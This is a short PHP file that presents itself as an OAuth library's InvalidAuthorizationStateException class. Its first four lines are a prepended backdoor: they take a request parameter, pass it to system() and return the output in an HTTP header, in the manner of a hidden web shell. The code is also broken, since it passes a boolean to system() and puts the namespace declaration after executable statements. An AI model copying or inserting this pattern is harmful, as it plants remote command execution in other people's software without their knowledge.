<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\OAuth2\Service\Exception;

/**
 * Exception thrown when the state parameter received during the authorization process is invalid.
 */
class InvalidAuthorizationStateException extends \Exception
{
}
